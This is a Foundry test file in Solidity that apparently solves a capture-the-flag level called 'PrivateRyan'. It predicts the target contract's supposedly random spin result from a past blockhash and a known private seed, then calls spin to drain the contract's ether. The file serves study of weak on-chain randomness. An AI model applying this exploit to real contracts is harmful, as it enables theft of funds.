// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 max = 100;
        uint256 seed = 4;
        uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = 48743985 - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));
        uint256 result = uint256((uint256(hashVal) / factor)) % max;
        instance.spin{value: 0.01 ether}(result);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
